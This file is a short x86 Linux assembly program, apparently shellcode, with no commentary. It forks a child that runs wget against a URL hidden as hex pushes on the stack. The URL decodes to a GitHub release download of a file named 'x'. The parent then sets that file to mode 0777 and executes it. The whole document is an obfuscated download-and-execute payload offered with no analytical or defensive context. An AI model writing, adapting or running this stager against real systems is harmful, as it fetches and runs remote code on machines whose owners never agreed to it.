section .text
    global _start

_start:
; fork
    xor eax,eax
    mov al,0x2
    int 0x80
    xor ebx,ebx
    cmp eax,ebx
    jz child

; waitpid
    xor edx, edx
    mov ebx, eax
    xor eax,eax
    mov al,0x7
    int 0x80

; chmod
    xor ecx,ecx
    xor eax,eax
    push eax
    mov al,0xf
    push byte +0x78
    mov ebx,esp
    xor ecx,ecx
    mov cx,0x1ff
    int 0x80

; execve
    xor eax,eax
    push eax
    push byte +0x78
    mov ebx,esp
    push eax
    mov edx,esp
    push ebx
    mov ecx,esp
    mov al,0xb
    int 0x80

; exit
    xor eax,eax
    inc eax
    int 0x80

child:
; execve
    push byte +0xb
    pop eax
    cdq
    push edx

; url
    push dword 0x782f332e
    push dword 0x312e3176
    push dword 0x2f64616f
    push dword 0x6c6e776f
    push dword 0x642f7365
    push dword 0x7361656c
    push dword 0x65722f79
    push dword 0x68736f6f
    push dword 0x6d2f7376
    push dword 0x6f746173
    push dword 0x6f6c6f76
    push dword 0x722f6d6f
    push dword 0x632e6275
    push dword 0x68746967
    push dword 0x2f2f3a73
    push dword 0x70747468
    mov ecx,esp
    push edx

; /usr/bin/wget
    push byte +0x74
    push dword 0x6567772f
    push dword 0x6e69622f
    push dword 0x7273752f
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80
